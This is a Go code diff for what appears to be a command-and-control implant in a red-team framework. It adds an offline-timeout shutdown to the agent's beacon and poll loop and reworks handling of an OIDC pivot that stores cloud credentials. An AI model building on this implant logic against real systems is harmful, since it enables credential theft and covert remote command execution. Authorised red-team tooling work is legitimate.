@@ -45,6 +45,8 @@ type Config struct {
 	// BeaconInterval is how often to check in with the Kitchen.
 	BeaconInterval time.Duration
 
+	MaxOffline time.Duration
+
 	// DwellTime is how long to stay active for interactive commands.
 	// Used with express mode: 0=run once, >0=run for this duration.
 	DwellTime time.Duration
@@ -71,6 +73,7 @@ func DefaultConfig() Config {
 		KitchenURL:     "http://localhost:8080",
 		SessionID:      "",
 		BeaconInterval: 30 * time.Second,
+		MaxOffline:     0,
 		HTTPTimeout:    30 * time.Second,
 		CommandTimeout: 5 * time.Minute,
 		Silent:         true,
@@ -137,9 +140,16 @@ func (a *Agent) AgentID() string {
 // Run starts the agent's main loop.
 func (a *Agent) Run(ctx context.Context) error {
 	slog.Info("brisket agent started", "agent_id", a.agentID)
+	lastContact := time.Now()
 
 	if err := a.beacon(ctx); err != nil {
 		slog.Warn("initial beacon failed", "error", err)
+		if a.maxOfflineExceeded(lastContact) {
+			slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
+			return nil
+		}
+	} else {
+		lastContact = time.Now()
 	}
 
 	ticker := time.NewTicker(a.config.BeaconInterval)
@@ -153,20 +163,37 @@ func (a *Agent) Run(ctx context.Context) error {
 		case <-ticker.C:
 			if err := a.beacon(ctx); err != nil {
 				slog.Warn("beacon failed", "error", err)
+				if a.maxOfflineExceeded(lastContact) {
+					slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
+					return nil
+				}
 				continue
 			}
+			lastContact = time.Now()
 
 			orders, err := a.poll(ctx)
 			if err != nil {
 				slog.Warn("poll failed", "error", err)
+				if a.maxOfflineExceeded(lastContact) {
+					slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
+					return nil
+				}
 				continue
 			}
+			lastContact = time.Now()
 
 			for _, order := range orders {
 				a.executeOrder(ctx, order)
 			}
 		}
 	}
+}
+
+func (a *Agent) maxOfflineExceeded(lastContact time.Time) bool {
+	if a.config.MaxOffline <= 0 {
+		return false
+	}
+	return time.Since(lastContact) >= a.config.MaxOffline
 }
 
 // RunOnce performs a single beacon and command execution cycle (Smash & Grab mode).
@@ -474,12 +501,20 @@ func (a *Agent) executeOrderInner(ctx context.Context, order *models.Order, cole
 				pivotArgs = order.Args[2:]
 			}
 			pivotResult, err := a.OIDCPivot(provider, pivotArgs)
-			if err != nil {
+			if pivotResult == nil {
 				coleslaw.SetError(fmt.Errorf("OIDC pivot failed: %w", err))
 			} else {
+				exitCode := 0
+				if err != nil || !pivotResult.Success {
+					exitCode = 1
+				}
 				a.storeCloudCreds(pivotResult)
 				pivotData, err := json.Marshal(pivotResult)
-				setMarshaledOutput(coleslaw, pivotData, err)
+				if err != nil {
+					coleslaw.SetError(fmt.Errorf("failed to marshal result: %w", err))
+				} else {
+					coleslaw.SetOutput(pivotData, nil, exitCode)
+				}
 			}
 		} else {
 			audience := getArgOrEnv(order.Args, "audience", "")
